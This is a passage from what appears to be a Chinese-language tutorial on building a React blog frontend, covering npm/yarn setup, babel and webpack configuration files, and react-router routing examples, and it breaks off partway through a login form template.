<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#24819;&#33258;&#24049;&#26500;&#24314;&#33050;&#25163;&#26550;&#65292;&#21487;&#20197;&#20351;&#29992;&#22914;&#19979;&#21629;&#20196;</span>
$<span style="color: #a0522d;">npm</span> install  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26500;&#24314;&#33050;&#25163;&#26550;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#30456;&#24403;&#20110;npm install react-router #&#28155;&#21152;react-router&#32452;&#20214;</span>
yarn add react-router <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;&#36335;&#30001;&#65292;&#21363;&#39033;&#30446;&#21069;&#31471;web&#36335;&#30001;</span>
yarn add react-router-dom <span style="color: #b22222;">#</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25253;&#38169;&#35299;&#20915;</span>
npm install --save-dev @types/react-router-dom@latest
</pre>
</div>

<p>
4.相关命令
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">npm命令</th>
<th scope="col" class="org-left">Yarn命令</th>
<th scope="col" class="org-left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left"><code>npm install</code></td>
<td class="org-left"><code>yarn install</code></td>
<td class="org-left">安装</td>
</tr>

<tr>
<td class="org-left"><code>npm install [package] --save</code></td>
<td class="org-left"><code>yarn add [package]</code></td>
<td class="org-left">安装运行时依赖</td>
</tr>

<tr>
<td class="org-left"><code>npm install [package] --save-dev</code></td>
<td class="org-left"><code>yarn add [package] --dev</code></td>
<td class="org-left">安装开发时依赖</td>
</tr>

<tr>
<td class="org-left"><code>npm install [package] --global</code></td>
<td class="org-left"><code>yarn global add [package]</code></td>
<td class="org-left">全局安装</td>
</tr>

<tr>
<td class="org-left"><code>npm uninstall [package]</code></td>
<td class="org-left"><code>yarn remove [package]</code></td>
<td class="org-left">卸载</td>
</tr>
</tbody>
</table>
</div>
<div id="outline-container-h:7b410468-5351-46bb-8687-ac4ac468081b" class="outline-4">
<h4 id="h:7b410468-5351-46bb-8687-ac4ac468081b">完整的文件</h4>
<div class="outline-text-4" id="text-h:7b410468-5351-46bb-8687-ac4ac468081b">
</div>
<div id="outline-container-h:3c64db3a-59f1-49bd-937d-6612ac98358c" class="outline-5">
<h5 id="h:3c64db3a-59f1-49bd-937d-6612ac98358c">webpack</h5>
<div class="outline-text-5" id="text-h:3c64db3a-59f1-49bd-937d-6612ac98358c">
<p>
<a href="https://webpack.js.org/awesome-webpack/#react">https://webpack.js.org/awesome-webpack/#react</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">frontend/
    &#9474;-.babelrc
    &#9474;-.gitignore <span style="color: #b22222;">#</span><span style="color: #b22222;">git&#30340;&#24573;&#30053;&#25991;&#20214;</span>
    &#9474;-.npmrc    <span style="color: #b22222;">#</span><span style="color: #b22222;">npm&#30340;&#26381;&#21153;&#22120;&#37197;&#32622;&#65292;&#26412;&#27425;&#20351;&#29992;&#30340;&#26159;&#38463;&#37324;</span>
    &#9474;-index.html <span style="color: #b22222;">#</span><span style="color: #b22222;">dev server&#20351;&#29992;&#30340;&#39318;&#39029;</span>
    &#9474;-jsconfig.json
    &#9474;-LICENSE
    &#9474;-package-lock.json
    &#9474;-package.json  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#39033;&#30446;&#30340;&#26681;&#30446;&#24405;&#23433;&#35013;&#25991;&#20214;&#65292;&#20351;&#29992;npm install&#21487;&#20197;&#26500;&#24314;&#39033;&#30446;</span>
    &#9474;-README.md
    &#9474;-webpack.config.dev.js <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24320;&#21457;&#29992;&#30340;&#37197;&#32622;&#25991;&#20214;</span>
    &#9474;-webpack.config.prod.js <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#20135;&#29615;&#22659;&#65292;&#25171;&#21253;&#29992;&#30340;&#37197;&#32622;&#25991;&#20214;</span>
    &#9492;&#9472;src/
        &#9474;- index.html <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27169;&#26495;&#39029;&#38754;</span>
        &#9474;- index.js
</pre>
</div>

<p>
.babelrc
</p>
<div class="org-src-container">
<pre class="src src-sh">{
  <span style="color: #8b2252;">"presets"</span>: [
    <span style="color: #8b2252;">"react"</span>,
    <span style="color: #8b2252;">"env"</span>,
    <span style="color: #8b2252;">"stage-0"</span>
  ],
  <span style="color: #8b2252;">"plugins"</span>: [
    <span style="color: #8b2252;">"transform-decorators-legacy"</span>,
    <span style="color: #8b2252;">"transform-runtime"</span>,
    // <span style="color: #8b2252;">"react-hot-loader/babel"</span>,
    [<span style="color: #8b2252;">"import"</span>, {
      <span style="color: #8b2252;">"libraryName"</span>: <span style="color: #8b2252;">"antd"</span>,
      <span style="color: #8b2252;">"libraryDirectory"</span>: <span style="color: #8b2252;">"es"</span>,
      <span style="color: #8b2252;">"style"</span>: true // <span style="color: #ff00ff;">`style: true`</span> &#20250;&#21152;&#36733; less &#25991;&#20214;
    }]
  ]
}
</pre>
</div>

<p>
.gitignore
</p>
<ul class="org-ul">
<li>git的忽略文件</li>
</ul>

<p>
.npmrc
</p>
<ul class="org-ul">
<li>npm的服务器配置，本次使用的是阿里</li>
</ul>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">registry</span>=https://registry.npmmirror.com
</pre>
</div>

<p>
index.html #dev server使用的首页
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">&#39033;&#30446;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">&#39033;&#30446;</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
&lt;<span style="color: #0000ff;">hr</span>&gt;
&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"root"</span>&gt;&lt;/<span style="color: #0000ff;">div</span>&gt;
&lt;<span style="color: #0000ff;">script</span> <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"/assets/bundle.js"</span>&gt;&lt;/<span style="color: #0000ff;">script</span>&gt;
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<p>
jsconfig.json
</p>
<div class="org-src-container">
<pre class="src src-sh">{
    <span style="color: #8b2252;">"compilerOptions"</span>: {
        <span style="color: #8b2252;">"target"</span>: <span style="color: #8b2252;">"ES6"</span>,
        <span style="color: #8b2252;">"module"</span>: <span style="color: #8b2252;">"commonjs"</span>,
        <span style="color: #8b2252;">"experimentalDecorators"</span>: true
    }
}
</pre>
</div>

<p>
LICENSE
</p>
<div class="org-src-container">
<pre class="src src-sh">The MIT License (MIT)

<span style="color: #0000ff;">Copyright</span> (c) 2025 jasper

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the <span style="color: #8b2252;">"Software"</span>), to deal<span style="color: #a020f0;"> in</span>
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to<span style="color: #a020f0;"> do</span> so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included<span style="color: #a020f0;"> in</span> all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED <span style="color: #8b2252;">"AS IS"</span>, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
</pre>
</div>

<p>
package-lock.json
</p>

<p>
package.json
</p>
<ul class="org-ul">
<li>项目的根目录安装文件，使用npm install可以构建项目</li>
</ul>
<div class="org-src-container">
<pre class="src src-sh">{
  <span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"blog"</span>,
  <span style="color: #8b2252;">"version"</span>: <span style="color: #8b2252;">"1.0.0"</span>,
  <span style="color: #8b2252;">"description"</span>: <span style="color: #8b2252;">"blog project"</span>,
  <span style="color: #8b2252;">"main"</span>: <span style="color: #8b2252;">"index.js"</span>,
  <span style="color: #8b2252;">"scripts"</span>: {
    <span style="color: #8b2252;">"test"</span>: <span style="color: #8b2252;">"jest"</span>,
    <span style="color: #8b2252;">"start"</span>: <span style="color: #8b2252;">"webpack-dev-server --config webpack.config.dev.js --hot --inline --open"</span>,
    <span style="color: #8b2252;">"build"</span>: <span style="color: #8b2252;">"rimraf dist &amp;&amp; webpack -p --config webpack.config.prod.js"</span>
  },
  <span style="color: #8b2252;">"repository"</span>: {},
  <span style="color: #8b2252;">"author"</span>: <span style="color: #8b2252;">"abc"</span>,
  <span style="color: #8b2252;">"license"</span>: <span style="color: #8b2252;">"MIT"</span>,
  <span style="color: #8b2252;">"devDependencies"</span>: {
    <span style="color: #8b2252;">"babel-core"</span>: <span style="color: #8b2252;">"^6.24.1"</span>,
    <span style="color: #8b2252;">"babel-jest"</span>: <span style="color: #8b2252;">"^19.0.0"</span>,
    <span style="color: #8b2252;">"babel-loader"</span>: <span style="color: #8b2252;">"^6.4.1"</span>,
    <span style="color: #8b2252;">"babel-plugin-import"</span>: <span style="color: #8b2252;">"^1.13.8"</span>,
    <span style="color: #8b2252;">"babel-plugin-transform-decorators-legacy"</span>: <span style="color: #8b2252;">"^1.3.4"</span>,
    <span style="color: #8b2252;">"babel-plugin-transform-runtime"</span>: <span style="color: #8b2252;">"^6.23.0"</span>,
    <span style="color: #8b2252;">"babel-preset-env"</span>: <span style="color: #8b2252;">"^1.4.0"</span>,
    <span style="color: #8b2252;">"babel-preset-react"</span>: <span style="color: #8b2252;">"^6.24.1"</span>,
    <span style="color: #8b2252;">"babel-preset-stage-0"</span>: <span style="color: #8b2252;">"^6.24.1"</span>,
    <span style="color: #8b2252;">"css-loader"</span>: <span style="color: #8b2252;">"^0.28.0"</span>,
    <span style="color: #8b2252;">"html-webpack-plugin"</span>: <span style="color: #8b2252;">"^2.28.0"</span>,
    <span style="color: #8b2252;">"jest"</span>: <span style="color: #8b2252;">"^19.0.2"</span>,
    <span style="color: #8b2252;">"less"</span>: <span style="color: #8b2252;">"^2.7.2"</span>,
    <span style="color: #8b2252;">"less-loader"</span>: <span style="color: #8b2252;">"^4.0.3"</span>,
    <span style="color: #8b2252;">"react-hot-loader"</span>: <span style="color: #8b2252;">"^4.3.12"</span>,
    <span style="color: #8b2252;">"source-map"</span>: <span style="color: #8b2252;">"^0.5.6"</span>,
    <span style="color: #8b2252;">"source-map-loader"</span>: <span style="color: #8b2252;">"^0.2.1"</span>,
    <span style="color: #8b2252;">"style-loader"</span>: <span style="color: #8b2252;">"^0.16.1"</span>,
    <span style="color: #8b2252;">"uglify-js"</span>: <span style="color: #8b2252;">"^2.8.22"</span>,
    <span style="color: #8b2252;">"webpack"</span>: <span style="color: #8b2252;">"^2.4.2"</span>,
    <span style="color: #8b2252;">"webpack-dev-server"</span>: <span style="color: #8b2252;">"^2.4.2"</span>
  },
  <span style="color: #8b2252;">"dependencies"</span>: {
    <span style="color: #8b2252;">"antd"</span>: <span style="color: #8b2252;">"^3.10.9"</span>,
    <span style="color: #8b2252;">"axios"</span>: <span style="color: #8b2252;">"^0.16.1"</span>,
    <span style="color: #8b2252;">"babel-polyfill"</span>: <span style="color: #8b2252;">"^6.23.0"</span>,
    <span style="color: #8b2252;">"babel-runtime"</span>: <span style="color: #8b2252;">"^6.23.0"</span>,
    <span style="color: #8b2252;">"braft-editor"</span>: <span style="color: #8b2252;">"^2.3.9"</span>,
    <span style="color: #8b2252;">"js-cookie"</span>: <span style="color: #8b2252;">"^2.2.1"</span>,
    <span style="color: #8b2252;">"mobx"</span>: <span style="color: #8b2252;">"^4.6.0"</span>,
    <span style="color: #8b2252;">"mobx-react"</span>: <span style="color: #8b2252;">"^5.4.2"</span>,
    <span style="color: #8b2252;">"moment-timezone"</span>: <span style="color: #8b2252;">"^0.6.0"</span>,
    <span style="color: #8b2252;">"react"</span>: <span style="color: #8b2252;">"^16.6.3"</span>,
    <span style="color: #8b2252;">"react-dom"</span>: <span style="color: #8b2252;">"^16.6.3"</span>,
    <span style="color: #8b2252;">"react-router-dom"</span>: <span style="color: #8b2252;">"^5.3.3"</span>
  }
}
</pre>
</div>

<p>
README.md
</p>

<p>
webpack.config.dev.js
</p>
<ul class="org-ul">
<li>开发用的配置文件</li>
</ul>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">const</span> <span style="color: #a0522d;">path</span> = require(<span style="color: #8b2252;">'path'</span>);
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">webpack</span> = require(<span style="color: #8b2252;">'webpack'</span>);

module.exports = {
    devtool: <span style="color: #8b2252;">'source-map'</span>,
    entry: {
        <span style="color: #8b2252;">'app'</span>: [
            <span style="color: #8b2252;">'react-hot-loader/patch'</span>,
            <span style="color: #8b2252;">'./src/index'</span>
        ]
    },
    output: {
        path: path.join(__dirname, <span style="color: #8b2252;">'dist'</span>),
        filename: <span style="color: #8b2252;">'bundle.js'</span>,
        publicPath: <span style="color: #8b2252;">'/assets/'</span>
    },
    resolve: {
        extensions: [<span style="color: #8b2252;">'.js'</span>]
    },
    module: {
        rules: [
            {
                test: <span style="color: #8b2252;">/\.js$/</span>,
                exclude: <span style="color: #8b2252;">/node_modules/</span>,
                use: [
                    { loader: <span style="color: #8b2252;">'react-hot-loader/webpack'</span> },
                    { loader: <span style="color: #8b2252;">'babel-loader'</span> }
                ]
            },
            {
                test: <span style="color: #8b2252;">/\.css$/</span>,
                use: [
                    { loader: <span style="color: #8b2252;">"style-loader"</span> },
                    { loader: <span style="color: #8b2252;">"css-loader"</span> },
                ]
             }, 
            {
                test: <span style="color: #8b2252;">/\.less$/</span>,
                use: [
                    { loader: <span style="color: #8b2252;">"style-loader"</span> },
                    { loader: <span style="color: #8b2252;">"css-loader"</span> },
                    { loader: <span style="color: #8b2252;">"less-loader"</span> }
                ]
            }
        ]
    },
    plugins: [
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.optimize.OccurrenceOrderPlugin</span>(<span style="color: #008b8b;">true</span>),
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.HotModuleReplacementPlugin</span>(),
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.DefinePlugin</span>({<span style="color: #8b2252;">'process.env'</span>: {NODE_ENV: JSON.stringify(<span style="color: #8b2252;">'development'</span>)}})
    ],
    devServer: {
        compress: <span style="color: #008b8b;">true</span>,
        port: 3000,
        publicPath: <span style="color: #8b2252;">'/assets/'</span>,
        hot: <span style="color: #008b8b;">true</span>,
        inline: <span style="color: #008b8b;">true</span>,
        historyApiFallback: <span style="color: #008b8b;">true</span>,
        stats: {
            chunks: <span style="color: #008b8b;">false</span>
        },
        proxy: {
            <span style="color: #8b2252;">'/api'</span>: {
                target: <span style="color: #8b2252;">'http://127.0.0.1:8000'</span>,
                changeOrigin: <span style="color: #008b8b;">true</span>,
                pathRewrite: { <span style="color: #8b2252;">'^/api'</span>: <span style="color: #8b2252;">''</span> }
            }
        }
    }
};
</pre>
</div>

<p>
webpack.config.prod.js
</p>
<ul class="org-ul">
<li>生产环境，打包用的配置文件</li>
</ul>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">const</span> <span style="color: #a0522d;">path</span> = require(<span style="color: #8b2252;">'path'</span>);
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">webpack</span> = require(<span style="color: #8b2252;">'webpack'</span>);
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">HtmlWebpackPlugin</span> = require(<span style="color: #8b2252;">'html-webpack-plugin'</span>);

module.exports = {
    devtool: <span style="color: #8b2252;">'source-map'</span>,
    entry: {
        <span style="color: #8b2252;">'app'</span>: [
            <span style="color: #8b2252;">'./src/index'</span>
        ]
    },
    output: {
        path: path.join(__dirname, <span style="color: #8b2252;">'dist'</span>),
        filename: <span style="color: #8b2252;">'[name]-[hash:8].js'</span>,
        publicPath: <span style="color: #8b2252;">'/assets/'</span>
    },
    resolve: {
        extensions: [<span style="color: #8b2252;">'.js'</span>]
    },
    module: {
        rules: [
            {
                test: <span style="color: #8b2252;">/\.js$/</span>,
                exclude: <span style="color: #8b2252;">/node_modules/</span>, <span style="color: #b22222;">// </span><span style="color: #b22222;">&#19981;&#32534;&#35793;&#31532;&#19977;&#26041;&#21253;</span>
                use: [
                    { loader: <span style="color: #8b2252;">'react-hot-loader/webpack'</span> },
                    { loader: <span style="color: #8b2252;">'babel-loader'</span> }
                ]
            },
            {
                test: <span style="color: #8b2252;">/\.css$/</span>,
                use: [
                    { loader: <span style="color: #8b2252;">"style-loader"</span> },
                    { loader: <span style="color: #8b2252;">"css-loader"</span> },
                ]
             }, 
            {
                test: <span style="color: #8b2252;">/\.less$/</span>,
                use: [
                    { loader: <span style="color: #8b2252;">"style-loader"</span> },
                    { loader: <span style="color: #8b2252;">"css-loader"</span> },
                    { loader: <span style="color: #8b2252;">"less-loader"</span> }
                ]
            }
        ]
    },
    plugins: [
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.optimize.OccurrenceOrderPlugin</span>(<span style="color: #008b8b;">true</span>),
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.DefinePlugin</span>({ <span style="color: #8b2252;">'process.env'</span>: { NODE_ENV: JSON.stringify(<span style="color: #8b2252;">'production'</span>) } }),
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">webpack.optimize.UglifyJsPlugin</span>({
            compress: {
                warnings: <span style="color: #008b8b;">false</span>
            },
            sourceMap: <span style="color: #008b8b;">true</span>
        }),
        <span style="color: #a020f0;">new</span> <span style="color: #228b22;">HtmlWebpackPlugin</span>({
            template: <span style="color: #8b2252;">'src/index.html'</span>,
            inject: <span style="color: #008b8b;">true</span>
        })
    ]
};
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:19aac4a1-0284-43cc-a9f5-b4a832f44497" class="outline-3">
<h3 id="h:19aac4a1-0284-43cc-a9f5-b4a832f44497">开发</h3>
<div class="outline-text-3" id="text-h:19aac4a1-0284-43cc-a9f5-b4a832f44497">
</div>
<div id="outline-container-h:29488dbd-a446-4e2c-9e08-0b26154cac48" class="outline-4">
<h4 id="h:29488dbd-a446-4e2c-9e08-0b26154cac48">前端路由</h4>
<div class="outline-text-4" id="text-h:29488dbd-a446-4e2c-9e08-0b26154cac48">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">src/index.js</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">App</span> = props =&gt; &lt;<span style="color: #0000ff;">div</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#27979;&#35797;</span>&lt;/<span style="color: #0000ff;">div</span>&gt;

render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">npm run start</span>
yarn run start
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27983;&#35272;&#22120;&#25171;&#24320; IP:3000 &#30475;&#30475;&#25928;&#26524;</span>
</pre>
</div>

<ul class="org-ul">
<li>前端路由使用react-router组件完成</li>
<li>官方文档 <a href="https://v5.reactrouter.com/web/guides/quick-start">https://v5.reactrouter.com/web/guides/quick-start</a>
<ul class="org-ul">
<li>Route: <a href="https://v5.reactrouter.com/web/api/Route/path-string-string">https://v5.reactrouter.com/web/api/Route/path-string-string</a></li>
</ul></li>
<li>使用react-route主键，更改src/index.js</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">npm install react-router-dom   #&#22312;package.json&#24050;&#32463;&#25351;&#23450;&#23433;&#35013;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Home</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">About</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Default</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Always</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;&lt;<span style="color: #0000ff;">hr</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#39029;&#33050;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">exact &#31934;&#30830;&#21305;&#37197;</span>
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">strict</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}

render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>

<ul class="org-ul">
<li>在地址栏中输入<a href="http://127.0.0.1:3000/">http://127.0.0.1:3000/</a> 或 <a href="http://127.0.0.1:3000/about">http://127.0.0.1:3000/about</a> 能够看到页面的变化。</li>
<li>App中，使用了 <b>Router路由组件，Router是根，且它只能有一个元素，所以添加了Div</b></li>
</ul>
</div>
<div id="outline-container-h:25a04646-d405-492b-bd42-1c179d644578" class="outline-5">
<h5 id="h:25a04646-d405-492b-bd42-1c179d644578">Route指令</h5>
<div class="outline-text-5" id="text-h:25a04646-d405-492b-bd42-1c179d644578">
<ul class="org-ul">
<li>它负责静态路由，只能和Route指定的path匹配，组件就可以显示。URL变化，将重新匹配路径</li>
<li>component属性设置目标组件</li>
<li>path是匹配路径，如果匹配则显示组件
<ol class="org-ol">
<li>exact: 布尔值</li>
<li>strict: 布尔值</li>
</ol></li>
<li>没有path属性，组件将总是显示，例如=&lt;Route component={Always} /&gt;=</li>
<li>path属性还支持路径数组，意思是多个路径都可以匹配</li>
</ul>


<p>
<b>路由配置</b>
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">路径</th>
<th scope="col" class="org-left"><code>/about</code></th>
<th scope="col" class="org-left"><code>/about/</code></th>
<th scope="col" class="org-left"><code>/about/123</code></th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">path="/about"</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
</tr>

<tr>
<td class="org-left">exact path="/about"</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">exact path="<i>about</i>"</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">strict path="/about"</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
</tr>

<tr>
<td class="org-left">exact strict path="/about"</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">strict path="<i>about</i>"</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
</tr>

<tr>
<td class="org-left">exact strict path="<i>about</i>"</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>
<ul class="org-ul">
<li>exact 只能匹配本路径，不包含子路径</li>
<li>strict 路径尾部有 <i>, 则必须匹配这个</i>,也可以匹配子路径</li>
<li>exact strict 一起用，表示严格的等于当前指定路径</li>
</ul>

<p>
<b>Switch指令</b>
</p>
<ul class="org-ul">
<li>也可以将Route组织到一个Switch中，一旦匹配Switch中的一个Route，就不再匹配其他。但是Route是匹配所有，如果匹配就会显示组件，无path的Route始终匹配。</li>
<li>注意这个时候Always组件，其实是404组件了，因为只有Switch中其上的Route没有匹配，才轮到它。</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:42c12639-219d-4d3e-aa80-19bf58fe0b97" class="outline-4">
<h4 id="h:42c12639-219d-4d3e-aa80-19bf58fe0b97">登录组件</h4>
<div class="outline-text-4" id="text-h:42c12639-219d-4d3e-aa80-19bf58fe0b97">
<p>
在component目录下构建react组件
</p>

<p>
登录页面模板
</p>
<ul class="org-ul">
<li><a href="https://codepen.io/colorlib/pen/rxddKy?q=login&amp;limit=all&amp;type=type-pens">https://codepen.io/colorlib/pen/rxddKy?q=login&amp;limit=all&amp;type=type-pens</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"form"</span>&gt;
    &lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"register-form"</span>&gt;
    &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"name"</span>/&gt;
    &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"password"</span>/&gt;
    &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"email address"</span>/&gt;
    &lt;<span style="color: #0000ff;">button</span>&gt;create&lt;/<span style="color: #0000ff;">button</span>&gt;
